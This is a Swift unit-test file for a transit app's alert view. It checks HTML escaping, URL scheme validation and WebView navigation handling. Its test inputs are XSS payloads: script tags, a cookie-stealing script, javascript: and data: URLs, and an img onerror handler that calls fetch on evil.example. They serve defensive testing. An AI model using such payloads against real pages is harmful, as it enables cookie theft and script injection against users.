//
//  TransitAlertHTMLInjectionTests.swift
//  OBAKitTests
//
//  Copyright © Open Transit Software Foundation
//  This source code is licensed under the Apache 2.0 license found in the
//  LICENSE file in the root directory of this source tree.
//

import Foundation
import Testing
import WebKit
@testable import OBAKit
@testable import OBAKitCore

// MARK: - Mocks

/// Minimal `WKNavigationAction` subclass that lets tests supply a URL and navigation type.
private final class MockNavigationAction: WKNavigationAction {
    private let _request: URLRequest
    private let _navigationType: WKNavigationType

    init(request: URLRequest, navigationType: WKNavigationType) {
        self._request = request
        self._navigationType = navigationType
        super.init()
    }

    override var request: URLRequest { _request }
    override var navigationType: WKNavigationType { _navigationType }
}

/// Minimal in-memory implementation of `TransitAlertViewModel` for injection tests.
private struct MockTransitAlert: TransitAlertViewModel {
    var mockTitle: String?
    var mockBody: String?
    var mockURL: URL?

    func title(forLocale locale: Locale) -> String? { mockTitle }
    func body(forLocale locale: Locale) -> String? { mockBody }
    func url(forLocale locale: Locale) -> URL? { mockURL }
}

// MARK: - HTML Escaping Tests

/// Tests for `String.htmlEscaped`.
///
/// The helper is the lowest-level defence against HTML injection. These tests
/// verify each of the five escaped characters individually, confirm that
/// combinations are handled, and that plain text is returned unchanged.
@Suite(.serialized)
struct StringHTMLEscapedTests {

    @Test
    func `Ampersand is escaped`() {
        #expect("a & b".htmlEscaped == "a &amp; b")
    }

    @Test
    func `Less-than is escaped`() {
        #expect("<script>".htmlEscaped == "&lt;script&gt;")
    }

    @Test
    func `Greater-than is escaped`() {
        #expect("a > b".htmlEscaped == "a &gt; b")
    }

    @Test
    func `Double quote is escaped`() {
        #expect("say \"hi\"".htmlEscaped == "say &quot;hi&quot;")
    }

    @Test
    func `Single quote is escaped`() {
        #expect("it's".htmlEscaped == "it&#x27;s")
    }

    @Test
    func `Plain text is returned unchanged`() {
        let plain = "Normal alert: buses delayed on route 44."
        #expect(plain.htmlEscaped == plain)
    }

    @Test
    func `Script injection payload is neutralised`() {
        let payload = "<script>alert('xss')</script>"
        let escaped = payload.htmlEscaped
        #expect(!escaped.contains("<script>"))
        #expect(!escaped.contains("</script>"))
        #expect(escaped.contains("&lt;script&gt;"))
    }

    @Test
    func `img onerror payload is neutralised`() {
        let payload = #"<img src=x onerror="fetch('//evil.example')">"#
        let escaped = payload.htmlEscaped
        #expect(!escaped.contains("<img"))
        #expect(escaped.contains("&lt;img"))
    }

    @Test
    func `All five special characters in one string`() {
        let payload = #"<b id="x" class='y'>a & b</b>"#
        let escaped = payload.htmlEscaped
        #expect(escaped.contains("&lt;b"))
        #expect(escaped.contains("&amp;"))
        #expect(escaped.contains("&quot;"))
        #expect(escaped.contains("&#x27;"))
        #expect(!escaped.contains("<b"))
    }
}

// MARK: - HTML Fragment Tests

/// Tests for `TransitAlertDetailViewController.htmlFragment(for:locale:)`.
///
/// This static method is the single place where alert title and body are
/// assembled into an HTML fragment. Testing it directly (rather than loading
/// the full VC) gives precise, fast assertions without UIKit setup.
@Suite(.serialized)
struct TransitAlertHTMLFragmentTests {

    private let locale = Locale(identifier: "en")

    private func fragment(title: String, body: String) -> String {
        let alert = MockTransitAlert(mockTitle: title, mockBody: body)
        return TransitAlertDetailViewController.htmlFragment(for: alert, locale: locale)
    }

    // MARK: - Regression: clean input

    @Test
    func `Normal title and body appear verbatim in output`() {
        let html = fragment(title: "Service Disruption", body: "Route 44 delayed.")
        #expect(html.contains("Service Disruption"))
        #expect(html.contains("Route 44 delayed."))
    }

    // MARK: - Title escaping

    @Test
    func `Script tag in title is escaped`() {
        let html = fragment(title: "<script>alert('xss')</script>", body: "body")
        #expect(!html.contains("<script>"))
        #expect(html.contains("&lt;script&gt;"))
    }

    @Test
    func `img onerror in title is escaped`() {
        let html = fragment(title: #"<img src=x onerror="evil()">"#, body: "body")
        #expect(!html.contains("<img"))
        #expect(html.contains("&lt;img"))
    }

    @Test
    func `Ampersand in title is escaped`() {
        let html = fragment(title: "Buses & Trains", body: "body")
        #expect(html.contains("Buses &amp; Trains"))
        #expect(!html.contains("Buses & Trains"))
    }

    // MARK: - Body escaping

    @Test
    func `Script tag in body is escaped`() {
        let html = fragment(title: "title", body: "<script>steal(document.cookie)</script>")
        #expect(!html.contains("<script>"))
        #expect(html.contains("&lt;script&gt;"))
    }

    @Test
    func `img onerror in body is escaped`() {
        let html = fragment(title: "title", body: #"<img src=x onerror="fetch('//evil.example')">"#)
        #expect(!html.contains("<img"))
        #expect(html.contains("&lt;img"))
    }

    @Test
    func `javascript link in body is escaped`() {
        let html = fragment(title: "title", body: #"<a href="javascript:alert(1)">click</a>"#)
        #expect(!html.contains("<a href="))
        #expect(html.contains("&lt;a href="))
    }

    @Test
    func `Malformed HTML in body is escaped`() {
        let html = fragment(title: "title", body: "<<script>>evil<<")
        #expect(!html.contains("<<"))
        #expect(html.contains("&lt;&lt;"))
    }

    // MARK: - Newline handling

    @Test
    func `Newlines in body become br tags after escaping`() {
        let html = fragment(title: "title", body: "Line one\nLine two")
        // Newlines must be converted to <br> AFTER escaping, so the <br> itself survives
        #expect(html.contains("Line one<br>Line two"))
    }

    @Test
    func `Newline-containing injection payload is escaped before br substitution`() {
        // If escaping happened AFTER the newline substitution, the injected <br> would
        // survive in the output. Verify the order is correct.
        let html = fragment(title: "title", body: "<script>\nsteal()\n</script>")
        #expect(!html.contains("<script>"))
        #expect(html.contains("&lt;script&gt;"))
    }
}

// MARK: - Destination URL Scheme Tests

/// Tests for `TransitAlertDetailViewController.isValidAlertURL(_:)`.
///
/// `destinationURL` is private, so the scheme gate is tested via the
/// `isValidAlertURL` static helper it delegates to.
@Suite(.serialized)
struct TransitAlertDestinationURLTests {

    @Test
    func `https URL is valid`() {
        #expect(TransitAlertDetailViewController.isValidAlertURL(URL(string: "https://alerts.example.com/1")!))
    }

    @Test
    func `http URL is valid`() {
        #expect(TransitAlertDetailViewController.isValidAlertURL(URL(string: "http://alerts.example.com/1")!))
    }

    @Test
    func `HTTPS uppercase scheme is valid`() {
        #expect(TransitAlertDetailViewController.isValidAlertURL(URL(string: "HTTPS://alerts.example.com/1")!))
    }

    @Test
    func `javascript URL is invalid`() {
        #expect(!TransitAlertDetailViewController.isValidAlertURL(URL(string: "javascript:alert('xss')")!))
    }

    @Test
    func `ftp URL is invalid`() {
        #expect(!TransitAlertDetailViewController.isValidAlertURL(URL(string: "ftp://files.example.com/alert.pdf")!))
    }

    @Test
    func `data URL is invalid`() {
        #expect(!TransitAlertDetailViewController.isValidAlertURL(URL(string: "data:text/html,<script>evil()</script>")!))
    }
}

// MARK: - Navigation Delegate Tests

/// Tests for `TransitAlertDetailViewController`'s `WKNavigationDelegate`.
///
/// http/https link-activated navigations are cancelled and opened in Safari.
/// All other navigations (non-link types, non-http/https schemes) are allowed
/// to proceed — this covers the initial `loadHTMLString` load as well as any
/// link tap with a scheme the guard does not recognise.
@Suite(.serialized)
@MainActor
final class TransitAlertNavigationDelegateTests {

    private func policy(for url: URL, navigationType: WKNavigationType) async -> WKNavigationActionPolicy {
        let alert = MockTransitAlert(mockTitle: "t", mockBody: "b")
        let vc = TransitAlertDetailViewController(alert, locale: .current)
        _ = vc.view

        return await withCheckedContinuation { continuation in
            let request = URLRequest(url: url)
            let action = MockNavigationAction(request: request, navigationType: navigationType)
            #if DEBUG
            vc.webView(vc.testWebView, decidePolicyFor: action) { policy in
                continuation.resume(returning: policy)
            }
            #else
            continuation.resume(returning: .allow)
            #endif
        }
    }

    @Test
    func `Non-link navigation is allowed`() async {
        let result = await policy(for: URL(string: "about:blank")!, navigationType: .other)
        #expect(result == .allow)
    }

    @Test
    func `https link navigation is cancelled and opened externally`() async {
        let result = await policy(for: URL(string: "https://example.com")!, navigationType: .linkActivated)
        #expect(result == .cancel)
    }

    @Test
    func `http link navigation is cancelled and opened externally`() async {
        let result = await policy(for: URL(string: "http://example.com")!, navigationType: .linkActivated)
        #expect(result == .cancel)
    }

    @Test
    func `non-http link navigation is allowed — not intercepted`() async {
        // Non-http/https link taps fall through to .allow. The escaping layer
        // already prevents injected links from appearing in the DOM, so this
        // path is a belt-and-suspenders no-op in practice.
        let result = await policy(for: URL(string: "javascript:alert(1)")!, navigationType: .linkActivated)
        #expect(result == .allow)
    }
}
